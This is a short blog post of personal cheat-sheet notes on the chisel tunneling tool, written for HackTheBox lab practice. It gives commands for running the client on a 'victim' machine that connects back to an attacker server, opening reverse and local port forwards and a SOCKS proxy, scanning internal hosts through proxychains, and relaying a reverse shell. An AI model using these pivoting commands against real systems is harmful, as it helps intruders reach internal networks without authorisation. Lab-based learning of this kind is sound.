---
layout: post
title: My Notes about Chisel (Tool for Tunneling)
tags: [System Hacking]
comments: true
---

Hey guys today i am sharing my little notes about a insane tool called **chisel**. Chisel, one of the tool i am using mostly while doing HackTheBox.

Thanks to **ippsec** for teaching me about chisel.

Get chisel from [here](https://github.com/jpillora/chisel).

I will show you some important usages of chisel with example.

## Chisel cheat sheet.

* Here attacker IP is **10.14.14.14** and client IP is **10.10.10.10**.

### Reverse Pivot - Example

* Start chisel server on port 8000 (attacker system is server).

~~~
chisel server -p 8000 --reverse
~~~

   * --reverse : Tells the server that I want clients connecting in to be allowed to define reverse tunnels. This means clients connecting in can open listening ports on my kali box.

* From victim (10.10.10.10 is client).

~~~
chisel client 10.14.14.14:8000 R:8001:172.18.0.3:80 (This will listen on port 8001 on all interface on attacker box). (Bad way)
~~~

OR

~~~
chisel client 10.14.14.14:8000 R:127.0.0.1:8001:172.18.0.3:80 (Best way)
~~~

  * chisel connect to server.
    
  * and open port 8001 on remote box which is on server. R is for remote,
    
  * if any packet on server:8001 it will go through tunnel we created through 8000 and then send it out to 172.18.0.3:80.
    
So now we can do a curl command from our kali box (curl 127.0.0.1:8001) and we can now access website running on 172.18.0.3:80.

### Local Pivot - Example

* Start chisel server on port 8000 (attacker system is server).

~~~
chisel server -p 8000 
~~~

* From victim (10.10.10.10 is client). 

~~~
chisel client 10.14.14.14:8000 9001:127.0.0.1:8001
~~~

 * chisel connect to server.
 
 * open port 9001 on client (10.10.10.10).
 
 * any packet to 10.10.10.10:9001 will go through tunnel and land on port 10.14.14.14:8001.

So now send reverse shell to 9001 from somewhere on the network and recieve it on 8001 on attacker box.

### Socks Proxy

Chisel also supports **socks** option.

As usual,

* From attacker box start chisel server.

~~~
chisel server -p 8000 --reverse
~~~

* From victim (10.10.10.10 is client). 

~~~
chisel.exe client 10.14.14.14:8000 R:0.0.0.0:1080:socks
~~~

OR

~~~
chisel.exe client 10.14.14.14:8000 R:socks
~~~

I usually use proxychains. To use proxychains you just have to add the following line to **/etc/proxychains.conf**:

~~~
socks5 127.0.0.1 1080
~~~

Then use proxychains with all your favourite tools,

~~~
proxychains nmap -sC -sT -p 80 172.19.0.4
~~~

There are many other options with chisel that we can use. I only mentioned a few.

Hope this will help..
